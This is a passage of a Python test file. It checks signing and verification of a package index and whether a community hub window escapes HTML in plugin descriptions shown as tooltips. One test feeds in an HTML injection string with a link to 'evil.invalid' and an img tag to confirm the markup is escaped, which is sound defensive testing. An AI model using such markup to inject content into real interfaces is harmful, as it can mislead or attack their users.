    assert tool.main(["sign", str(index), "--key", "maintainers"]) == 0
    verified = CommunityManager._verify_index(index.read_bytes(), (tmp_path / "index.json.sig").read_bytes(), [key])
    assert verified.entries[0].sha256 == cp.hashlib.sha256((tmp_path / "p.zip").read_bytes()).hexdigest()
    assert tool.main(["sign", str(index), "--key", "maintainers", "--previous", str(index)]) == 1


def test_hub_tooltips_show_the_description_as_plain_text(qapp):
    from orchestrator.gui.community_hub import CommunityHubWindow
    hub = CommunityHubWindow(SimpleNamespace(community_manager=None))
    try:
        description = '<b>Fast</b> <a href="https://evil.invalid">board</a> & <img src="x">'
        hub.populate_table([SimpleNamespace(title="T", description=description, id="t", kind="target",
                                            version="1.0.0", trust=TrustLevel.COMMUNITY, author="a", revoked=None,
                                            installed_version=None, path=None)])
        tip = hub.table.item(0, 0).toolTip()
        assert "&lt;b&gt;Fast&lt;/b&gt;" in tip and "<a " not in tip and "<img" not in tip and "&amp;" in tip
    finally:
        hub.close()
